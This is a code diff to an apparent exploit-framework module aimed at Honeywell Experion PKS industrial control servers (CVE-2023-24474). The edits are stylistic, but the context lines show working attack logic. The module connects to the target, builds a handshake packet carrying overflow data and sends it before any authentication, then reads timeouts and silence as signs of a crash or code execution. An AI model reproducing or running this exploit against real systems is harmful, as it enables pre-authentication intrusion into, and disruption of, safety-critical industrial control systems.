@@ -86,7 +86,7 @@ class Exploit(Exploit):
             print_info("Research: Armis 'Scarecrow' — 9 CVEs in Honeywell Experion PKS")
             return
 
-        print_status("[CVE-2023-24474] Targeting Experion PKS at {}:{} ...".format(self.target, self.port))
+        print_status(f"[CVE-2023-24474] Targeting Experion PKS at {self.target}:{self.port} ...")
         try:
             sock = socket.socket()
             sock.settimeout(10)
@@ -103,23 +103,23 @@ class Exploit(Exploit):
             msg_length      = struct.pack("<I", len(overflow_data))
             packet          = EXPERION_MAGIC + MSG_HANDSHAKE + msg_length + overflow_data
 
-            print_status("[CVE-2023-24474] Sending pre-auth overflow in handshake ({} bytes) ...".format(len(packet)))
+            print_status(f"[CVE-2023-24474] Sending pre-auth overflow in handshake ({len(packet)} bytes) ...")
             sock.sendall(packet)
 
             import time; time.sleep(0.5)
             try:
                 resp = sock.recv(256)
                 if resp:
-                    print_success("[CVE-2023-24474] Response: {} bytes — Experion still responding".format(len(resp)))
+                    print_success(f"[CVE-2023-24474] Response: {len(resp)} bytes — Experion still responding")
                     print_info("Check Experion server logs for crash/RCE indicators")
                 else:
                     print_success("[CVE-2023-24474] No response — server may have crashed (RCE triggered)")
-            except socket.timeout:
+            except TimeoutError:
                 print_success("[CVE-2023-24474] Timeout — overflow likely triggered crash/code execution")
         except ConnectionRefusedError:
-            print_warning("[CVE-2023-24474] Port {} refused — verify Experion PKS API is on this port".format(self.port))
+            print_warning(f"[CVE-2023-24474] Port {self.port} refused — verify Experion PKS API is on this port")
         except Exception as exc:
-            print_error("[CVE-2023-24474] Error: {}".format(exc))
+            print_error(f"[CVE-2023-24474] Error: {exc}")
         finally:
             try:
                 sock.close()
